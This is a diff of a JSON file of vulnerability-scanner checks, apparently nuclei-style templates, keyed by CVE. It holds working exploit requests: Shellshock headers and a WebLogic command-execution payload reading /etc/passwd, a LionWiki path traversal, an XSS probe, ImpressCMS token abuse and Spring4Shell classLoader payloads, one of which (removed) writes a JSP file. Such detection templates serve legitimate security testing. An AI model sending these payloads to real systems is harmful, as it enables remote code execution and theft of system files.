@@ -3311,9 +3311,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -9790,8 +9790,8 @@
         {
           "body": "test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"Test-Header\");String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Test-Header": "cat /etc/passwd"
+            "Test-Header": "cat /etc/passwd",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -10796,6 +10796,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://notburpcollaborator.net"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-27191",
+      "info": {
+        "name": "LionWiki 3.2.11 - LFI",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?page=&action=edit&f1=.//./\\.//./\\.//./\\.//./\\.//./\\.//./etc/passwd&restore=1"
           ]
         }
       ]
@@ -13550,6 +13565,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/cgi/cal?year=2021%3C/title%3E%3Cscript%3Ealert(%27{{randstr}}%27)%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-26598",
+      "info": {
+        "name": "ImpressCMS - Incorrect Authorization",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /misc.php?action=showpopups&type=friend HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36\n",
+            "GET /include/findusers.php?token={{token}} HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36\n"
           ]
         }
       ]
@@ -16374,9 +16404,12 @@
       },
       "requests": [
         {
-          "raw": [
-            "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nc2: <%\nsuffix: %>\n\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(%22j%22))%7B%20out.println(new%20String(%22SPRING_CORE_RCE%22))%3B%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=checkexploit&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=\n",
-            "GET /checkexploit.jsp HTTP/1.1\nHost: {{Hostname}}\nTest: {{wait_for(10)}}\n"
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?class.module.classLoader.resources.context.configFile=https://{{interactsh-url}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx"
           ]
         }
       ]
